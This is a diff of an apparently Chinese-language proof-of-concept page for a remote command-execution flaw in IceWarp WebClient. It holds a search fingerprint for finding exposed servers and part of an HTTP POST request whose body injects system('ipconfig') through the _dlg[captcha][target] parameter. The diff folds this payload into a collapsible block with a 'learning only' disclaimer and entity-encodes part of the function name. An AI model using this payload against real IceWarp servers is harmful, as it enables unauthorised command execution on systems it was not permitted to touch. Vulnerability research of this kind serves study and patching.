@@ -25,8 +25,10 @@ IceWarp WebClient
 
 ```
 app="IceWarp-公司产品"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 登录页面如下
@@ -44,8 +46,9 @@ Content-Type: application/x-www-form-urlencoded
 Cookie: use_cookies=1
 Content-Length: 43
 
-_dlg[captcha][target]=system(\'ipconfig\')\
-```
+_dlg[captcha][target]=&#115;ystem(\'ipconfig\')\</code></pre>
+
+</details>
 
 
 
